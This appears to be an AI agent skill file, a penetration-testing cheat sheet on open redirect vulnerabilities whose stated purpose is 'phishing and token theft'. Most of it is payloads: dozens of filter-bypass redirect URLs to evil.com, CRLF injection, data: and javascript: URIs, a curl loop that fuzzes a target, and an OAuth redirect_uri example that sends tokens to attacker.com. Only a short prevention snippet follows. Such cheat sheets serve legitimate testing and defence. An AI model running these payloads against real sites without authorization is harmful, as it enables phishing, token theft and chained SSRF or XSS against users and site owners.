---
name: open-redirect
description: Open redirect bypass techniques for phishing and token theft. Use when testing redirect functionality.
---

# Open Redirect

## Description
Open Redirect vulnerabilities occur when a web application redirects users to a URL specified via user-controlled input without proper validation. Attackers can use this to redirect victims to malicious websites for phishing, malware distribution, or to steal OAuth tokens.

## Common Vulnerable Parameters

```
?url=
?redirect=
?redirect_url=
?redirect_uri=
?next=
?return=
?return_to=
?return_url=
?rurl=
?dest=
?destination=
?go=
?goto=
?target=
?link=
?checkout_url=
?continue=
?forward=
?out=
?view=
?file=
?path=
?to=
```

## HTTP Redirect Status Codes

```
300 - Multiple Choices
301 - Moved Permanently
302 - Found (Temporary Redirect)
303 - See Other
307 - Temporary Redirect
308 - Permanent Redirect

Meta refresh: <meta http-equiv="refresh" content="0;url=...">
JavaScript: window.location = "..."
```

## Basic Payloads

### Absolute URL
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

### Protocol-Relative URL
```
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=\/\/evil.com
https://target.com/redirect?url=\/\evil.com
```

### Without Protocol
```
https://target.com/redirect?url=evil.com
https://target.com/redirect?url=www.evil.com
```

## Filter Bypass Techniques

### 1. Using @ Symbol
```
https://target.com/redirect?url=https://target.com@evil.com
https://target.com/redirect?url=https://evil.com@target.com
```

### 2. Using Backslash
```
https://target.com/redirect?url=https://evil.com\target.com
https://target.com/redirect?url=//evil.com\@target.com
https://target.com/redirect?url=\/\/evil.com
```

### 3. Subdomain/Domain Confusion
```
# If validation checks for "target.com"
https://target.com/redirect?url=https://evil.com/target.com
https://target.com/redirect?url=https://target.com.evil.com
https://target.com/redirect?url=https://eviltarget.com
https://target.com/redirect?url=https://target.com-evil.com
https://target.com/redirect?url=https://targetevilcom.com
```

### 4. URL Encoding
```
https://target.com/redirect?url=https%3A%2F%2Fevil.com
https://target.com/redirect?url=%2F%2Fevil.com
https://target.com/redirect?url=%252f%252fevil.com (double encoding)
```

### 5. Case Manipulation
```
https://target.com/redirect?url=HTTPS://EVIL.COM
https://target.com/redirect?url=HtTpS://eViL.cOm
```

### 6. Null Byte Injection
```
https://target.com/redirect?url=https://evil.com%00.target.com
https://target.com/redirect?url=https://evil.com%0d%0a.target.com
```

### 7. Parameter Pollution
```
https://target.com/redirect?url=https://target.com&url=https://evil.com
https://target.com/redirect?url=https://target.com%26url=https://evil.com
```

### 8. Fragment Identifier
```
https://target.com/redirect?url=https://evil.com#.target.com
https://target.com/redirect?url=#https://evil.com
```

### 9. Question Mark
```
https://target.com/redirect?url=https://evil.com?.target.com
https://target.com/redirect?url=https://evil.com?target.com
```

### 10. CRLF Injection
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
https://target.com/redirect?url=%E5%98%8A%E5%98%8DLocation:%20https://evil.com
```

### 11. Whitelisted Domain Bypass
```
# If target.com is whitelisted
https://target.com/redirect?url=https://target.com.evil.com
https://target.com/redirect?url=https://evil.com/target.com
https://target.com/redirect?url=https://evil.com?target.com
https://target.com/redirect?url=https://evil.com#target.com
```

### 12. Localhost/Internal
```
https://target.com/redirect?url=http://localhost
https://target.com/redirect?url=http://127.0.0.1
https://target.com/redirect?url=http://[::1]
https://target.com/redirect?url=http://0
https://target.com/redirect?url=http://0.0.0.0
```

### 13. Data URI
```
https://target.com/redirect?url=data:text/html,<script>alert(1)</script>
https://target.com/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 14. JavaScript URI
```
https://target.com/redirect?url=javascript:alert(1)
https://target.com/redirect?url=javascript://alert(1)
```

## Advanced Bypass Payloads

### Unicode Normalization
```
https://target.com/redirect?url=https://ⓔⓥⓘⓛ.ⓒⓞⓜ
https://target.com/redirect?url=https://еvіl.com (Cyrillic)
```

### IP Address Formats
```
https://target.com/redirect?url=http://0x7f.0.0.1 (hex)
https://target.com/redirect?url=http://2130706433 (decimal)
https://target.com/redirect?url=http://0177.0.0.1 (octal)
```

### Path-Based Redirect
```
https://target.com/redirect/https://evil.com
https://target.com/redirect/http://evil.com
https://target.com/out/https://evil.com
```

### Mixed Encoding
```
https://target.com/redirect?url=https://evil%252Ecom
https://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

## Payload List

```
https://evil.com
//evil.com
\/\/evil.com
/\/evil.com
/\evil.com
https:evil.com
https:/evil.com
https://target.com@evil.com
https://evil.com#.target.com
https://evil.com?.target.com
https://evil.com\.target.com
https://evil.com\@target.com
//evil.com/%2f%2e%2e
/%09/evil.com
///evil.com
////evil.com
https://evil.com/%2e%2e
https://evil.com/%252e%252e
```

## Testing Methodology

### 1. Identify Redirect Parameters
```bash
# Look for common parameters
# Check JavaScript for redirect logic
# Monitor network traffic for redirects
```

### 2. Test Basic Redirects
```bash
curl -I "https://target.com/redirect?url=https://evil.com"
# Check Location header
```

### 3. Test Bypasses
```bash
# Iterate through bypass techniques
for payload in $(cat redirect_payloads.txt); do
    response=$(curl -s -I "https://target.com/redirect?url=$payload" | grep -i "location")
    echo "$payload: $response"
done
```

### 4. Verify Redirect
```bash
# Follow redirects
curl -L "https://target.com/redirect?url=https://evil.com"
```

## Impact Scenarios

### Phishing
```
https://trusted-bank.com/redirect?url=https://fake-bank.com/login
# User sees trusted domain, gets redirected to phishing site
```

### OAuth Token Theft
```
https://oauth.provider.com/auth?
    client_id=APP&
    redirect_uri=https://app.com/callback/../redirect?url=https://attacker.com&
    response_type=token
```

### Chaining with Other Vulnerabilities
```
# Open Redirect + SSRF
https://target.com/redirect?url=http://internal-server/admin

# Open Redirect + XSS (if redirected to data: URI)
https://target.com/redirect?url=data:text/html,<script>alert(1)</script>
```

## Prevention

```javascript
// Whitelist approach
const allowedDomains = ['target.com', 'subdomain.target.com'];

function isValidRedirect(url) {
    try {
        const parsed = new URL(url, 'https://target.com');
        return allowedDomains.some(domain =>
            parsed.hostname === domain ||
            parsed.hostname.endsWith('.' + domain)
        );
    } catch {
        return false;
    }
}

// Relative URLs only
function isRelativeUrl(url) {
    return url.startsWith('/') && !url.startsWith('//');
}
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
- https://portswigger.net/kb/issues/00500100_open-redirection-reflected
